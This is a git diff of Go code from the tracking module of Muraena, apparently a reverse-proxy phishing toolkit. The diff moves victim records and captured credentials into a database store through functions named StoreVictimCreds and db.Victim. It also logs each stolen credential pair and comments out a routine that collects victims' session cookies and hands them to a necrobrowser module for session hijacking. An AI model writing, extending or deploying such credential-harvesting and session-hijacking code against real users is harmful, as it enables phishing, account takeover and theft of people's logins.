@@ -1,8 +1,9 @@
 package tracking
 
 import (
-	"encoding/json"
+	//"encoding/json"
 	"fmt"
+	"github.com/muraenateam/muraena/core/db"
 	"net/http"
 	"net/url"
 	"path"
@@ -274,14 +275,14 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 			IPSource = request.Header.Get(module.Session.Config.Tracking.IPSource)
 		}
 
-		var sm sync.Map
-		v := &Victim{
+		v := &db.Victim{
 			ID:           t.ID,
 			IP:           IPSource,
 			UA:           request.UserAgent(),
 			RequestCount: 1,
-			Cookies:      sm,
+			FirstSeen:    time.Now().String(),
 		}
+
 		module.Push(v)
 		module.Info("New victim [%s] IP[%s] UA[%s]", tui.Bold(tui.Red(t.ID)), IPSource, request.UserAgent())
 
@@ -294,7 +295,7 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 }
 
 // TrackResponse tracks an HTTP Response
-func (module *Tracker) TrackResponse(response *http.Response) (victim *Victim) {
+func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim) {
 
 	// Do Not Track if not required
 	if !module.Enabled {
@@ -380,10 +381,17 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 							}
 						}
 
-						c := &VictimCredentials{p.Label, value, time.Now()}
-						victim.Credentials = append(victim.Credentials, c)
+						creds := &db.VictimCredential{
+							Key:   p.Label,
+							Value: value,
+							Time:  time.Now().String(),
+						}
 
-						t.Info("[%s] New credentials! [%s:%s]", t.ID, c.Key, c.Value)
+						err := db.StoreVictimCreds(victim.ID, creds)
+						if err != nil {
+							return false, err
+						}
+						t.Info("[%s] New credentials! [%s:%s]", t.ID, creds.Key, creds.Value)
 						found = true
 					}
 				}
@@ -403,7 +411,7 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 func (t *Trace) HijackSession(request *http.Request) (err error) {
 	getSession := false
 
-	victim, err := t.GetVictim(t)
+	_, err = t.GetVictim(t)
 	if err != nil {
 		return
 	}
@@ -422,28 +430,29 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 		var cookies string
 
 		// get all the cookies from the CookieJar
-		victim.Cookies.Range(func(k, v interface{}) bool {
-			_, c := k.(string), v.(necrobrowser.SessionCookie)
-			j, err := json.Marshal(c)
-			if err != nil {
-				t.Warning(err.Error())
-			}
-
-			cookies += string(j) + " "
-			t.Debug("Adding cookie: %s \n %v", string(j), c)
-
-			sessCookies = append(sessCookies, necrobrowser.SessionCookie{
-				Name:     c.Name,
-				Value:    c.Value,
-				Domain:   c.Domain,
-				Expires:  "", // will be set by necrobrowser
-				Path:     c.Path,
-				HTTPOnly: c.HTTPOnly,
-				Secure:   c.Secure,
-			})
-
-			return true
-		})
+		// TODO re-enable this using REDIS instead
+		//victim.Cookies.Range(func(k, v interface{}) bool {
+		//	_, c := k.(string), v.(necrobrowser.SessionCookie)
+		//	j, err := json.Marshal(c)
+		//	if err != nil {
+		//		t.Warning(err.Error())
+		//	}
+		//
+		//	cookies += string(j) + " "
+		//	t.Debug("Adding cookie: %s \n %v", string(j), c)
+		//
+		//	sessCookies = append(sessCookies, necrobrowser.SessionCookie{
+		//		Name:     c.Name,
+		//		Value:    c.Value,
+		//		Domain:   c.Domain,
+		//		Expires:  "", // will be set by necrobrowser
+		//		Path:     c.Path,
+		//		HTTPOnly: c.HTTPOnly,
+		//		Secure:   c.Secure,
+		//	})
+		//
+		//	return true
+		//})
 
 		t.Info("Authenticated Session for %s: %s", t.ID, tui.Red(cookies))
 
@@ -456,7 +465,7 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 				SessionCookies: sessCookies,
 				// TODO hack to pass more info for necrobrowser
 				//Keywords:       t.Session.Config.NecroBrowser.Keywords,
-				Keywords: []string{fmt.Sprintf("%s_%s", victim.Username, victim.ID)},
+				//Keywords: []string{fmt.Sprintf("%s_%s", victim.Username, victim.ID)},
 			}
 
 			m, err := t.Session.Module("necrobrowser")
